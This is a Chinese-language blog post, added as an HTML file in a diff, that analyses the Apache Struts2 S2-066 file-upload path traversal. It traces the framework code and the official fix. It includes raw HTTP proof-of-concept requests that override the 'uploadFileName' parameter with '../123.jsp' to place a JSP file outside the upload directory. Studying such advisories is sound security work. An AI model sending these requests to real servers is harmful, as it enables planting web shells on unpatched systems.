@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ki10Moc" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      S2-066分析 
+      
+      
+      |
+    
+     ki10Moc&#39;s World
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/1.png">
+    <link rel="icon" href="/images/1.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RG82N8DQZ9"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-RG82N8DQZ9');
+    </script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="ki10Moc's World" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">ki10Moc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">ki10Moc</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">S2-066分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2023-12-11 17:36:36
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                    <b>#</b> 代码审计
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                    <b>#</b> Java安全
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/Struts2/" title="Struts2">
+                    <b>#</b> Struts2
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/CVE/" title="CVE">
+                    <b>#</b> CVE
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="漏洞描述"><a class="markdownIt-Anchor" href="#漏洞描述">#</a> 漏洞描述</h2>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211095248309.png" alt="image-20231211095248309"></p>
+<h2 id="影响版本"><a class="markdownIt-Anchor" href="#影响版本">#</a> 影响版本</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.5</span><span class="number">.0</span> &lt;= Struts &lt;= <span class="number">2.5</span><span class="number">.32</span></span><br><span class="line"><span class="number">6.0</span><span class="number">.0</span> &lt;= Struts &lt;= <span class="number">6.3</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
+<h2 id="修复版本"><a class="markdownIt-Anchor" href="#修复版本">#</a> 修复版本</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Apache Struts2 &gt;= <span class="number">2.5</span><span class="number">.33</span></span><br><span class="line">Apache Struts2 &gt;= <span class="number">6.3</span><span class="number">.0</span><span class="number">.2</span></span><br></pre></td></tr></table></figure>
+<h2 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建">#</a> 环境搭建</h2>
+<p>测试版本</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;struts2-core&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">6.3</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<p>百度网盘</p>
+<h2 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析">#</a> 漏洞分析</h2>
+<p>首先看下官方修复的代码</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163">https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163</a></p>
+<p>这里可以看到有几处都讲参数转换为小写，漏洞应该和这个有关系</p>
+<p>我们先上传一个文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /S2_066_war_exploded/upload.action HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 248</span><br><span class="line">Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line">Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;../1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">This is test</span><br><span class="line">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211145549898.png" alt="image-20231211145549898"></p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211145930148.png" alt="image-20231211145930148"></p>
+<p>打上断点看下流程</p>
+<p>在 org.apache.struts2.interceptor.FileUploadInterceptor#intercept 中</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211151544422.png" alt="image-20231211151544422"></p>
+<p>这里通过 multiWrapper.getFileNames 方法，对 wrapper 封装的 request 对象以及 inputname 来获取到 filename</p>
+<p>通过数组加载进 accept 方法</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211154023490.png" alt="image-20231211154023490"></p>
+<p>然后判断不为空开始遍历 accept，将其加载进参数</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211161357489.png" alt="image-20231211161357489"></p>
+<p>再来看 strut 是如何处理文件名的</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211163356689.png" alt="image-20231211163356689"></p>
+<p>大概理解下代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">getCanonicalName</span><span class="params">(<span class="keyword">final</span> String originalFileName)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> originalFileName;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">forwardSlash</span> <span class="operator">=</span> fileName.lastIndexOf(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">backwardSlash</span> <span class="operator">=</span> fileName.lastIndexOf(<span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (forwardSlash != -<span class="number">1</span> &amp;&amp; forwardSlash &gt; backwardSlash) &#123;</span><br><span class="line">            fileName = fileName.substring(forwardSlash + <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            fileName = fileName.substring(backwardSlash + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fileName;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>匹配最后一个 / 的位置</p>
+<p>在本例中则为 2，也就是 forwardSlash</p>
+<p>而…/1.txt 中没有 \\</p>
+<p>所以 backwardSlash 为 - 1</p>
+<p>所以 if 条件满足</p>
+<p>执行 fileName = fileName.substring (forwardSlash + 1);</p>
+<p>赋值新的 filename，也就是 / 后面的内容，也就是请求的文件 1.txt</p>
+<p>最终返回</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211164346848.png" alt="image-20231211164346848"></p>
+<p>并 set 存储到上传对象中</p>
+<p>这段代码也就是拦截了路径穿越</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211171719991.png" alt="image-20231211171719991"></p>
+<p>以上上传文件的对象最终会保存到 HttpParameter 参数中</p>
+<p>所以看下是不是可以变量覆盖</p>
+<p>其实刚出的时候看过官方的 commit，看到修改了几个小写</p>
+<p>我想到的就是大小写绕过，但是不可能这么简单，就在想是不是什么地方或者是什么加载器也加载了文件和文件内容，导致文件上传。</p>
+<p>先来看看上下文对象获取的大概流程</p>
+<p>上下文是从 ac.getParameters () 获取的</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211175525092.png" alt="image-20231211175525092"></p>
+<p>一直跟进到 ActionContext 下的 get 方法</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211175927070.png" alt="image-20231211175927070"></p>
+<p>下面就是找上下文的创建，在 org.apache.struts2.dispatcher.Dispatcher#serviceAction</p>
+<p>这里获取上下文是 map 结构存储，key 唯一</p>
+<p>那这里就不太可能存在变量覆盖</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211180829481.png" alt="image-20231211180829481"></p>
+<p>然后再看会不会是参数绑定</p>
+<p>在 com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211195921775.png" alt="image-20231211195921775"></p>
+<p>这里参数绑定会经过三个</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">params.entrySet()</span><br><span class="line">parameters.entrySet()</span><br><span class="line">acceptableParameters.entrySet()</span><br></pre></td></tr></table></figure>
+<p>其中 params 和 parameters 都是通过 HttpParamteters 对象加载上传文件和类型，内容</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211201631821.png" alt="image-20231211201631821"></p>
+<p>而 acceptableParameters 是通过 TreeMap 加载的</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211201808865.png" alt="image-20231211201808865"></p>
+<p>但是这个加载是有顺序的</p>
+<p>通过代码测试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个TreeMap对象</span></span><br><span class="line">        TreeMap&lt;Object, Object&gt; objectObjectTreeMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向TreeMap中添加两个键值对</span></span><br><span class="line">        objectObjectTreeMap.put(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        objectObjectTreeMap.put(<span class="string">&quot;A&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印TreeMap对象</span></span><br><span class="line">        System.out.println(objectObjectTreeMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211201017453.png" alt="image-20231211201017453"></p>
+<p>可以看到会优先大写的</p>
+<p>这里直接跟着 Y4 爷的步伐。。。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.action HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Content-Length: 188</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------</span></span><br><span class="line"><span class="comment">xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</span></span><br><span class="line"><span class="comment">(KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1aaa</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;UPloadFileName&quot;;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment">1323.jsp</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span><br></pre></td></tr></table></figure>
+<p>在 ognl.OgnlRuntime#_getSetMethod 获取 setter ⽅法时调⽤了 ognl.OgnlRuntime#getDeclaredMethods 做处理</p>
+<p>这里了遍历方法名，加载到 set 方法，setUpload</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211213047462.png" alt="image-20231211213047462"></p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211214207202.png" alt="image-20231211214207202"></p>
+<p>得到值为 1，也就是 public 修饰符</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211213810889.png" alt="image-20231211213810889"></p>
+<p>后去就是 m 的值赋给新的成员变量，到达 result 返回</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211214418882.png" alt="image-20231211214418882"></p>
+<p>最终通过_getSetMethod 返回 method</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211214607186.png" alt="image-20231211214607186"></p>
+<p>中间就都是一些类的处理，不是很重要</p>
+<p>我们直接看 addIfAccessor 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addIfAccessor</span><span class="params">(List result, Method method, String baseName, <span class="type">boolean</span> findSets)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ms</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        <span class="keyword">if</span> (ms.endsWith(baseName)) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isSet</span> <span class="operator">=</span> <span class="literal">false</span>, isIs = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span> ((isSet = ms.startsWith(SET_PREFIX)) || ms.startsWith(GET_PREFIX)</span><br><span class="line">                    || (isIs = ms.startsWith(IS_PREFIX))) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">prefixLength</span> <span class="operator">=</span> (isIs ? <span class="number">2</span> : <span class="number">3</span>);</span><br><span class="line">                <span class="keyword">if</span> (isSet == findSets) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (baseName.length() == (ms.length() - prefixLength)) &#123;</span><br><span class="line">                        result.add(method);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>大概梳理下逻辑</p>
+<p>首先检查方法名是否是以’baseName’结尾</p>
+<p>如果是，进一步检查是否以几个前缀开始的</p>
+<p>如果是 is 开头长度为 2，不是则为 3</p>
+<p>如果和要找的设置器响度相等，就比较 ms 方法减去前缀，其实也就是 baseName 的方法名，如果一致，就添加到 result 中</p>
+<p>其中关于 baseName，我们来看下 getDeclaredMethods</p>
+<p>其中这部分</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">baseName</span> <span class="operator">=</span> capitalizeBeanPropertyName(propertyName);</span><br><span class="line">                    result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">                    collectAccessors(targetClass, baseName, result, findSets);</span><br></pre></td></tr></table></figure>
+<p>经过 capitalizeBeanPropertyName 方法处理后得到 baseName</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="variable">first</span> <span class="operator">=</span> propertyName.charAt(<span class="number">0</span>);</span><br><span class="line">        <span class="type">char</span> <span class="variable">second</span> <span class="operator">=</span> propertyName.charAt(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123;</span><br><span class="line">            <span class="keyword">return</span> propertyName;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">char</span>[] chars = propertyName.toCharArray();</span><br><span class="line">            chars[<span class="number">0</span>] = Character.toUpperCase(chars[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>简单描述下就是，如果传过来的 baseName，首字母是小写的，第二个字母是大写的，直接返回</p>
+<p>否则就大写第一个字母返回</p>
+<p>又因为我们要触发的是 com.struts2.UploadAction#setUploadFileName</p>
+<p>其中 baseName 也就是 UploadFileName</p>
+<p>那就只能写成 UploadFileName 或者是 uploadFileName</p>
+<p>poc1：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /S2_066_war_exploded/upload.action HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8080</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Length: 406</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This is test</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;uploadFileName&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">../123.jsp</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211205052719.png" alt="image-20231211205052719"></p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211205122110.png" alt="image-20231211205122110"></p>
+<p>poc2:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /S2_066_war_exploded/upload.action?uploadFileName=../<span class="number">1234.</span>jsp HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8080</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Length: 406</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This is test</span></span><br><span class="line"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211205158357.png" alt="image-20231211205158357"></p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231211205213052.png" alt="image-20231211205213052"></p>
+<h2 id="漏洞修复"><a class="markdownIt-Anchor" href="#漏洞修复">#</a> 漏洞修复</h2>
+<p>看 diff 不难发现官方将传递的参数改为大小写不敏感，<em>检查当前键是否与 nameLowerCase 相等，忽略大小写</em>，这样就会覆盖我们传递的值</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/12/05/HTB-codify/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2023-12-11 17:36:36
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                        <b>#</b> 代码审计
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                        <b>#</b> Java安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/Struts2/" title="Struts2">
+                        <b>#</b> Struts2
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/CVE/" title="CVE">
+                        <b>#</b> CVE
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2024/06/16/Bugku-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%952/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
